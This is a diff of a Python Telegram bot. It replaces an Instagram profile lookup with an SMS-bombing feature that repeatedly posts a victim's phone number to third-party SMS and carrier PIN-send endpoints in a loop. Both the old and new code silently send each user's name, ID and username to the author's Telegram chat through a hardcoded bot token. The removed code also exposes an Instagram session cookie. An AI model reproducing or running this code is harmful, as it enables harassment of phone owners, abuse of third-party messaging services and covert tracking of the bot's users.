@@ -14,50 +14,77 @@ logger.setLevel(logging.DEBUG)
 
 @bot.message_handler(commands=["start"])
 def start(message):
+	zz = 1
 	name_name = message.chat.first_name
 	las_name = message.chat.last_name
 	user_tele = message.chat.username
 	id_tele = message.chat.id
-	bot.send_message(message.chat.id, text=f"<strong>Hello [ {name_name} {las_name} ]\nBot Get Info Account Instagram\nPlease Send user IG </strong>",parse_mode="html")
-	ID = '1396476109'
-	TOKEN = '1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q'
-	sensess = requests.get(f'''https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text= NEW LOGIN BOT\nNAME: {name_name} {las_name}\nID: {id_tele}\nuser: @{user_tele}''')
-@bot.message_handler(func=lambda m: True)
-def Creat(message):
-	name_name = message.chat.first_name
-	las_name = message.chat.last_name
-	user = message.text
-	url = f"https://www.instagram.com/{user}/?__a=1"
-	head = {
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-encoding': 'gzip, deflate, br',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'cookie': 'mid=YbysKAALAAGnsY7iGX9WEyOe8AaT; ig_did=EF4C2AFE-037F-4E1B-A158-C08728818708; ig_nrcb=1; ds_user_id=50787014839; csrftoken=UToGyPsqeTDVOZ7RVJNpWfFjMVUkdHn3; sessionid=50787014839%3Ajhdr3dv7iFRPYb%3A21; rur="RVA\05450787014839\0541672416874:01f7f7d72f9624862a45b7c7ed6092af21b367cd6ec4806e50222845967307214f80dac8"',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': "Windows",
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62'
-    }
-	
+	bot.send_message(message.chat.id,text='<strong>Hello Pro Bot Send Message\nPlease send the phone number with the number of messages\nEx: 011********:5</strong>',parse_mode="html")
+	zz+=1
+	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW LOGIN BOT\nNAME: {name_name} {las_name}\nID: {id_tele}\nuser: @{user_tele}\nLOGIN NUMBER {zz}''')
+@bot.message_handler(func=lambda call: True)
+def true(message):
+	aa = 0
+	m = message.text
 	try:
-		request1 = requests.get(url,headers=head,data={'__a': '1'}).json()
-		id_pro = request1['logging_page_id'].split('_')[1]
-		get = request1['graphql']
-		iid = get['user']
-		idd = iid['edge_follow']
-		iid1 = iid['edge_followed_by']
-		followed = iid1['count']
-		follow = idd['count']
-		photo = iid['profile_pic_url']
-		bot.send_photo(message.chat.id,f"{photo}",caption=f"<strong>•User</strong>: {user}\n<strong>•Id</strong>: {id_pro}\n<strong>•Followers</strong>: {followed}\n<strong>•Following</strong>: {follow}\n<strong>•By</strong>: @Freeintrnt",parse_mode="html")
+		True
+		number= int(m.split(':')[0])
+		loop = int(m.split(':')[1])
 	except:
-		bot.send_message(message.chat.id, text=f"<strong>Error [ {name_name} {las_name} ]\nPlease Try Agin /start </strong>",parse_mode="html")
+		False
+		bot.send_message(message.chat.id,text='<strong>Please Send Nunber\nTry Again /start </strong>',parse_mode="html")
+	cookies = requests.get('https://goldencircle777.com/index/send/sendsms')
+	think_var = cookies.cookies['think_var']
+	sc389b705 = cookies.cookies['sc389b705']
+	headers={
+"conten-type":"application/x-www-form-urlencoded; charset=UTF-8",
+"accept":"*/*",
+"cache-cntrol":"no-cache",
+"user-agent":"Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.60 Mobile Safari/537.36",
+"referer":"https://goldencircle777.com/index/user/register/invite_code/HDM6EF.html",
+"origin":"https://goldencircle777.com",
+"cookie":f"think_var={think_var}; sc389b705={sc389b705}"
+}
+	data={"tel":number,"code":"+20"}
+	ur="http://gateway.mondiapay.com/mondiapay-etisalat-eg-b2b-v1/web/authorize/pin/send"
+	hd={
+"Host":"gateway.mondiapay.com",
+"Connection":"keep-alive",
+"Content-Length":"518",
+"Cache-Control":"max-age=0",
+"Upgrade-Insecure-Requests":"1",
+"Origin":"http://gateway.mondiapay.com",
+"Content-Type":"application/x-www-form-urlencoded",
+"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36"
+}
+	da={
+"msisdn":number,
+"clientId":"d3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe",
+"redirectUrl":"http://etisalat-eg-lcm.mondia.com/etisalat-eg-lcm-v1/web/auth/callBack?client_id=d3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe&redirectUrl=https://etisalat-music.com/lcm/login/token?lcmKey=ETISALAT_EG_MUSIC&redirectBack=%2Fhome&access_token=C6a85885c-d1c1-4756-a732-cf8b5fe40388",
+"metaData.cssUrl":"http://menad2c.mondiamedia.com/mpay/mondiapay-etisalat-eg-b2b/music/css/app.css",
+"Login":"LOGIN",
+}
+	aa+=1
+	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW REQUEST OF BOT\nNUMBER {number}\nNumber Message {loop}\nNumber Request {aa}''')
+	for i in range(loop):
+		rr = requests.post('https://goldencircle777.com/index/send/sendsms',headers=headers,data=data)
+		
+		if ("رقم الهاتف غير مهيأ بشكل صحيح") in rr.text:
+			r=requests.post(ur,headers=hd,data=da)
+			if "emptyMsg" in r.text:
+				bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 ERROR </strong>  ",parse_mode="html")
+		elif ("إرسال بنجاح") in rr.text:
+			
+			r=requests.post(ur,headers=hd,data=da)
+			if "emptyMsg" in r.text:
+				
+				
+				bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 DONE</strong>  ",parse_mode="html")
+		else:
+			er +=1
+			r=requests.post(ur,headers=hd,data=da)
+			if "emptyMsg" in r.text:
+				bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 ERROR</strong>  ",parse_mode="html")
 		
 
 @server.route(f"/{BOT_TOKEN}", methods=["POST"])
